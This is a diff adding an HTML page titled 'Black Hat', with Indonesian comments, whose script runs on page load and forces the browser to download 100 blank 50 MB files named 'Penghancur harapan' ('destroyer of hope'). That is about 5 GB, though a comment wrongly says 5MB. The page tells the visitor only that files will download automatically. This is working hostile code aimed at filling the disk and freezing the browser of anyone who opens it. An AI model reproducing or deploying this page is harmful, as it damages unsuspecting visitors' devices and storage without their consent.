@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Black Hat - Y Dark Mode 0_0</title>
+  <script>
+    function unduhFile() {
+      var jumlahFile = 100; // Jumlah file yang akan diunduh
+      var ukuranFile = 1024 * 1024 * 50; // Ukuran file dalam byte (5MB)
+      var tipeFile = 'application/octet-stream'; // Tipe file
+      var namaFile = 'Penghancur harapan'; // Nama file
+
+      for (var i = 0; i < jumlahFile; i++) {
+        var link = document.createElement('a');
+        link.href = URL.createObjectURL(new Blob([new ArrayBuffer(ukuranFile)], { type: tipeFile }));
+        link.download = namaFile + (i + 1) + '.bin';
+        link.click();
+      }
+    }
+
+    window.onload = function() {
+      unduhFile();
+    };
+  </script>
+</head>
+<body>
+  <h1>Unduh File Otomatis</h1>
+  <p>File akan diunduh secara otomatis.</p>
+</body>
+</html>
